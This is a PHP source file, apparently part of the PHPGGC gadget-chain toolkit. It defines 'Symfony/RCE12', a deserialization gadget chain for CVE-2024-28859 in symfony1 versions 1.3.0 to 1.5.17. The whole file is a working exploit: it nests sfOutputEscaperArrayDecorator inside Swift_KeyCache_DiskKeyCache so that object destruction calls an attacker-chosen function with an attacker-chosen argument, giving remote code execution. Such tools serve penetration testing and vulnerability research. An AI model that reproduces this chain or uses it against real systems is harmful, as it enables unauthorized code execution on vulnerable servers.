<?php

namespace GadgetChain\Symfony;

class RCE12 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.3.0 <= 1.5.13~17';
    public static $vector = '__destruct';
    public static $author = 'darkpills';
    public static $information = 'Works until 1.5.13, and until 1.5.17 if installed via git method, not composer (CVE-2024-28859)';

    public function generate(array $parameters)
    {
        $cacheKey = "1";
        $keys = new \sfOutputEscaperArrayDecorator($parameters['function'], array($cacheKey => $parameters['parameter']));

        // a rmdir($path . '/' $cacheKey) will be done by Swift_KeyCache_DiskKeyCache::clearAll() 
        // so put something that will never exists to avoid issues
        $path = "thispathshouldneverexists";
        $cache = new \Swift_KeyCache_DiskKeyCache($keys, $path);

        return $cache;
    }
}
